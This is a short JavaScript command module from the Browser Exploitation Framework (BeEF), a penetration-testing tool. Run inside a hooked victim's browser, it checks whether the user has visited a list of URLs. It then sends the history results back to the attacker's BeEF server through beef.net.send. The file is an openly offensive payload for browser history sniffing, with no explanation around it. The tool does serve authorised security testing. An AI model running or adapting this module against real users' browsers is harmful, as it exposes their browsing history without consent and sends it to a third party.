//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var results = beef.browser.hasVisited("<%== format_multiline(@urls) %>");
	var comp = '';
	for (var i=0; i < results.length; i++)
	{
		comp += results[i].url+' = '+results[i].visited+'  ';
	}
	beef.net.send("<%= @command_url %>", <%= @command_id %>, comp);
});

